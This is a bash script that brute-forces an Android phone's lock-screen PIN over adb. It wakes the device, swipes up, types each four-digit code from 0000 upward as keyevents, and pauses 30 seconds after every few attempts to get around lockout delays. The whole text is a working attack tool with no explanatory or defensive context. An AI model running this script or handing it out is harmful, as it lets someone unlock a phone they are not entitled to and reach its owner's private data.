#!/usr/bin/env bash

echo ---------------
echo PAYLOAD STARTED
echo ---------------

adb shell input keyevent 82
adb shell input swipe 407 1211 378 84

echo -------------
echo BRUTE FORCING
echo -------------

for i in {0000..10000}; do

    echo -----------
    echo TRYING $i
    echo -----------
	
    for (( j=0; j<${#i}; j++ )); do
        adb shell input keyevent $((`echo ${i:$j:1}`+7))
    done

    adb shell input keyevent 66
    
    if ! (( `expr $i + 1` % 4 )); then
        adb shell input keyevent 66
        sleep 30
        adb shell input keyevent 82
        adb shell input swipe 407 1211 378 84
    fi
done
